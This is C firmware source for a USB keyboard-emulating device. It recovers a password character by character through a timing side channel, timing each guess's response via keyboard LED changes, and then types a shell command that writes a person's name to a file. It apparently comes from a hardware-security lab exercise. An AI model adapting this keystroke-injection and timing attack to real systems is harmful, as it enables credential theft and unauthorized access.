#include "password_attack.h"
#include "german_keyboardCodes.h"
#include <string.h>

// File creation command sequence: cd $HOME\necho "MEHMET ARSLAN" > 03811532\n
static const char file_creation_cmd[] = "cd $HOME\necho \"MEHMET ARSLAN\" > 03811532\n";
static const uint8_t file_creation_cmd_len = sizeof(file_creation_cmd) - 1;

// Password attack state
static uint8_t curr_char_id = 0;
static uint8_t position_id_in_attempt = 0;
static char confirmed_password[25] = {0};
static uint8_t confirmed_len = 0;

// Timing measurement state
static uint32_t timings[86] = {0};
static uint32_t start_time = 0;
static uint8_t last_led_state = 0;
static volatile uint32_t timer_ms = 0;

// Control flags
static bool waiting_for_response = false;
static bool is_button_pressed = false;
static bool attack_completed = false;
static bool send_enter_now = false;

// File creation state
static uint8_t file_cmd_index = 0;

void SysTick_Handler(void)
{
	timer_ms++;
}

extern uint8_t getCharCodeInGerman(char c, uint8_t* modifier);

void attack_init(void)
{
	curr_char_id = 0;
	position_id_in_attempt = 0;
	confirmed_len = 0;
	start_time = 0;

	waiting_for_response = false;
	is_button_pressed = false;
	attack_completed = false;
	send_enter_now = false;

	file_cmd_index = 0;

	memset(confirmed_password, 0, sizeof(confirmed_password));
	memset(timings, 0, sizeof(timings));
}

// Send file creation commands character by character
static void sendFileCreationCommand(USB_KeyboardReport_Data_t* report)
{
	if (file_cmd_index >= file_creation_cmd_len)
	{
		return;
	}

	if (!is_button_pressed)
	{
		char c = file_creation_cmd[file_cmd_index];

		if (c == '\n')
		{
			report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
			report->Modifier = 0;
		}
		else
		{
			report->KeyCode[0] = getCharCodeInGerman(c, &(report->Modifier));
		}
		is_button_pressed = true;
	}
	else
	{
		is_button_pressed = false;
		file_cmd_index++;
	}
}

// Main HID report creation - coordinates password attack and file creation
void attack_create_report(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = 0;

	if (attack_completed)
	{
		sendFileCreationCommand(report);
		return;
	}

	// Try all characters in charset for current password position
	if (curr_char_id < password_set_of_chars_len)
	{
		if (!send_enter_now)
		{
			// Type known password prefix + test character
			if (position_id_in_attempt < confirmed_len)
			{
				sendResolvedChars(report);
			}
			else
			{
				sendUnsolvedCurrentChar(report);
			}
		}
		else
		{
			sendEnterKey(report);
		}
	}
	else
	{
		// All characters tested - find best match
		findBestTimeAndExtractPasswordChar();
	}
}

// Send already-cracked password characters
void sendResolvedChars(USB_KeyboardReport_Data_t* report)
{
	if (position_id_in_attempt < confirmed_len)
	{
		if (!is_button_pressed)
		{
			char c = confirmed_password[position_id_in_attempt];
			report->KeyCode[0] = getCharCodeInGerman(c, &(report->Modifier));
			is_button_pressed = true;
		}
		else
		{
			is_button_pressed = false;
			position_id_in_attempt++;
		}
	}
}

// Send the current test character
void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report)
{
	if (curr_char_id < password_set_of_chars_len)
	{
		if (!send_enter_now)
		{
			if (!is_button_pressed)
			{
				char current_char = password_set_of_chars[curr_char_id];
				report->KeyCode[0] = getCharCodeInGerman(current_char, &(report->Modifier));
				is_button_pressed = true;
			}
			else
			{
				position_id_in_attempt = 0;
				is_button_pressed = false;
				send_enter_now = true;
			}
		}
	}
}

// Send Enter key and start timing measurement
void sendEnterKey(USB_KeyboardReport_Data_t* report)
{
	if (!is_button_pressed)
	{
		report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
		report->Modifier = 0;
		start_time = timer_ms;
		is_button_pressed = true;
		waiting_for_response = true;
	}
	else
	{
		is_button_pressed = false;
		send_enter_now = false;
	}
}

// Analyze timing results and select character with longest delay (correct character)
void findBestTimeAndExtractPasswordChar()
{
	uint32_t longest_time = 0;
	uint8_t longest_time_id = 0;

	for (uint8_t i = 0; i < password_set_of_chars_len; i++)
	{
		if (timings[i] > longest_time)
		{
			longest_time = timings[i];
			longest_time_id = i;
		}
	}

	confirmed_password[confirmed_len++] = password_set_of_chars[longest_time_id];

	// Reset for next character - CAPSLOCK detection handles completion
	curr_char_id = 0;
	memset(timings, 0, sizeof(timings));
}

// Process LED state changes for timing measurement
void attack_process_response(uint8_t* led_report)
{
	uint8_t current_led_state = *led_report;

	// Record timing when LED state changes (authenticator response)
	if (waiting_for_response && (current_led_state != last_led_state))
	{
		uint32_t end_time = timer_ms;
		timings[curr_char_id++] = end_time - start_time;
		waiting_for_response = false;
	}

	last_led_state = current_led_state;
}

void mark_attack_completed()
{
	attack_completed = true;
}
